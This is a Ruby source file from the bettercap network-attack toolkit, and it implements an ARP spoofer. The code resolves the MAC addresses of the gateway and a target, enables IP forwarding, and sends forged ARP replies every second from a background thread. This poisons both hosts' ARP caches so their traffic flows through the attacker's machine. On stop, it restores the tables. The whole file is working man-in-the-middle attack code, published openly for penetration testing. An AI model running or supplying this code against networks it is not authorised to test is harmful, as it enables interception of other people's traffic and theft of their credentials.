=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require_relative '../base/ispoofer'
require_relative '../network'
require_relative '../factories/firewall_factory'
require_relative '../factories/log_factory'
require 'colorize'

class ArpSpoofer < ISpoofer
  def initialize( iface, router_ip, target_ip )
    @iface        = iface
    @gw_ip        = router_ip
    @gw_hw        = nil
    @target_ip    = target_ip
    @target_hw    = nil
    @log          = LogFactory.get()
    @firewall     = FirewallFactory.get_firewall
    @forwarding   = @firewall.forwarding_enabled?
    @spoof_thread = nil
    @running      = false

    @log.info "ARP SPOOFER SELECTED".yellow

    @log.info "Getting gateway #{@gw_ip} MAC address ..."
    @gw_hw = Network.get_hw_address( @iface, @gw_ip )
    if @gw_hw.nil? then
      raise "Couldn't determine router MAC"
    end

    @log.info "[-] Gateway MAC   : #{@gw_hw}"

    @log.info "Getting target #{@target_ip} MAC address ..."
    @target_hw = Network.get_hw_address( @iface, @target_ip )
    if @target_hw.nil? then
      raise "Couldn't determine target MAC"
    end

    @log.info "[-] Target MAC    : #{@target_hw}"

  end

  def send_spoofed_packed( saddr, smac, daddr, dmac )
    pkt = PacketFu::ARPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac
    pkt.arp_saddr_mac = smac
    pkt.arp_daddr_mac = dmac
    pkt.arp_saddr_ip = saddr
    pkt.arp_daddr_ip = daddr
    pkt.arp_opcode = 2

    pkt.to_w(@iface[:iface])
  end

  def start
    stop() unless @running == false

    @log.info "Starting ARP spoofer ...".yellow

    if @forwarding == false
      @log.debug "Enabling packet forwarding."

      @firewall.enable_forwarding(true)
    end

    @running = true
    @spoof_thread = Thread.new do
      loop do
        if not @running
            @log.debug "Stopping spoofing thread ..."
            Thread.exit
            break
        end

        @log.debug "Spoofing ..."

        send_spoofed_packed @gw_ip,     @iface[:eth_saddr], @target_ip, @target_hw
        send_spoofed_packed @target_ip, @iface[:eth_saddr], @gw_ip,     @gw_hw

        sleep(1)
      end
    end
  end

  def stop
    raise "ARP spoofer is not running" unless @running

    @log.info "Stopping ARP spoofer ...".yellow

    @log.debug "Resetting packet forwarding to #{@forwarding} ..."
    @firewall.enable_forwarding( @forwarding )

    @running = false
    @spoof_thread.join

    @log.info "Restoring ARP table ..."

    3.times do
      send_spoofed_packed @gw_ip,     @gw_hw, @target_ip, @target_hw
      send_spoofed_packed @target_ip, @target_hw, @gw_ip,     @gw_hw
      sleep 1
    end
  end
end
